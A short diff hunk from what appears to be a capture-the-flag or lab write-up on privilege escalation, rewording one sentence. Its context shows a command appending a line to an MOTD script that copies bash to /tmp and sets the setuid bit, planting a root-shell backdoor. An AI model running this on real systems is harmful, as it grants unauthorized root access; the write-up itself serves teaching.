@@ -206,7 +206,7 @@ traceback
 
 Cool, now that we've done that we need to overwrite the MOTD to something of our own.
 
-Then, back in our shell we can run:
+Back in our shell we can run:
 
 ```
 echo "cp /bin/bash /tmp/bash && chmod u+s /tmp/bash" >> /etc/update-motd.d/00-header
